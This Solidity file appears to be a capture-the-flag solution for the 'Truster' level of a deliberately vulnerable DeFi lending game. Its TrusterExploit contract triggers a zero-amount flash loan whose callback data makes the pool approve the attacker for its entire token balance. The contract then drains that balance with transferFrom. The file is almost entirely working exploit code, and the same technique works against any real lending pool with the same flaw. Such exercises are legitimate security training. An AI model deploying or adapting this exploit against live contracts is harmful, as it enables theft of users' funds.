// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
    external;
}
contract TrusterExploit {
    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(address _pool) external {
        ITrusterLenderPool(_pool).flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            abi.encodeWithSignature('approve(address,uint256)', address(this), damnValuableToken.balanceOf(_pool))
        );
        damnValuableToken.transferFrom(_pool, msg.sender, damnValuableToken.balanceOf(_pool));
    }
}